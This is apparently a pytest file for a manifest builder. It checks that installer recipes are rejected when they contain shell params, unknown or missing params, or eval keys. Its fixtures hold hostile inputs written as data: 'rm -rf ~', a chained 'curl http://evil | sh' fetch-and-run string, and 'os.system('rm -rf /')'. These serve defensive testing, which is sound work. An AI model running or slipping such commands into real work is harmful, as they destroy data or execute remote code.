"""MAN-03 — recipe ngoài allowlist/shell bị chặn khi build Manifest (tầng 2
sớm, trước cả ``validate_semantic``), KHÔNG tạo process, KHÔNG build được
Manifest."""

from __future__ import annotations

import pytest

from namios_core.errors import ErrorCode
from namios_core.recipe_types import CreatePrefix, InstallDependency, RunInstaller
from namios_manifest._builder import build_manifest
from namios_manifest._errors import ManifestLoadError

from ._fixtures import deep_copy, valid_raw_manifest


def test_recipe_with_shell_param_is_rejected() -> None:
    raw = deep_copy(valid_raw_manifest())
    raw["recipe"] = [
        {
            "action": "run_installer",
            "params": {
                "installer_ref": "installer.exe",
                "argv": ["installer.exe", "/S"],
                "shell": "rm -rf ~",
            },
        }
    ]

    with pytest.raises(ManifestLoadError) as exc_info:
        build_manifest(raw)

    assert any(e.code == ErrorCode.E_SEMANTIC_RECIPE.value for e in exc_info.value.errors)
    assert any("shell" in e.path for e in exc_info.value.errors)


def test_recipe_with_unknown_param_is_rejected() -> None:
    raw = deep_copy(valid_raw_manifest())
    raw["recipe"] = [
        {
            "action": "create_prefix",
            "params": {"prefix_architecture": "win64", "extra_unknown": "x"},
        }
    ]

    with pytest.raises(ManifestLoadError) as exc_info:
        build_manifest(raw)

    assert any(e.code == ErrorCode.E_SEMANTIC_RECIPE.value for e in exc_info.value.errors)


def test_run_installer_with_concatenated_shell_string_is_rejected() -> None:
    raw = deep_copy(valid_raw_manifest())
    raw["recipe"] = [
        {
            "action": "run_installer",
            "params": {
                "installer_ref": "installer.exe",
                "argv": ["installer.exe /S && curl http://evil | sh"],
            },
        }
    ]

    with pytest.raises(ManifestLoadError) as exc_info:
        build_manifest(raw)

    assert any(e.code == ErrorCode.E_SEMANTIC_RECIPE.value for e in exc_info.value.errors)


def test_valid_run_installer_argv_array_builds_ok() -> None:
    raw = deep_copy(valid_raw_manifest())
    raw["recipe"] = [
        {
            "action": "run_installer",
            "params": {
                "installer_ref": "installer.exe",
                "argv": ["installer.exe", "/S", "/norestart"],
            },
        }
    ]

    m = build_manifest(raw)

    assert len(m.recipe) == 1
    step = m.recipe[0]
    assert isinstance(step, RunInstaller)
    assert step.argv == ("installer.exe", "/S", "/norestart")


def test_valid_create_prefix_builds_typed_step() -> None:
    raw = deep_copy(valid_raw_manifest())
    raw["recipe"] = [{"action": "create_prefix", "params": {"prefix_architecture": "win32"}}]

    m = build_manifest(raw)

    assert m.recipe == (CreatePrefix(prefix_architecture="win32"),)


def test_invalid_prefix_architecture_value_is_rejected() -> None:
    raw = deep_copy(valid_raw_manifest())
    raw["recipe"] = [{"action": "create_prefix", "params": {"prefix_architecture": "arm64"}}]

    with pytest.raises(ManifestLoadError) as exc_info:
        build_manifest(raw)

    assert any(e.code == ErrorCode.E_SEMANTIC_RECIPE.value for e in exc_info.value.errors)


def test_install_dependency_step_builds_and_is_checked_later_by_semantic() -> None:
    raw = deep_copy(valid_raw_manifest())
    raw["recipe"] = [
        {"action": "install_dependency", "params": {"dependency_profile_id": "dotnet-48-x64"}}
    ]

    m = build_manifest(raw)

    assert m.recipe == (InstallDependency(dependency_profile_id="dotnet-48-x64"),)


def test_missing_required_param_is_rejected() -> None:
    raw = deep_copy(valid_raw_manifest())
    raw["recipe"] = [{"action": "verify_file", "params": {"path_label": "installer"}}]

    with pytest.raises(ManifestLoadError) as exc_info:
        build_manifest(raw)

    assert any(e.code == ErrorCode.E_SEMANTIC_RECIPE.value for e in exc_info.value.errors)


def test_eval_param_key_is_forbidden_regardless_of_action() -> None:
    raw = deep_copy(valid_raw_manifest())
    raw["recipe"] = [
        {
            "action": "set_registry_value",
            "params": {
                "key": "HKCU\\Software\\Demo",
                "value_name": "Mode",
                "value_type": "REG_SZ",
                "value": "1",
                "eval": "os.system('rm -rf /')",
            },
        }
    ]

    with pytest.raises(ManifestLoadError) as exc_info:
        build_manifest(raw)

    assert any(e.code == ErrorCode.E_SEMANTIC_RECIPE.value for e in exc_info.value.errors)
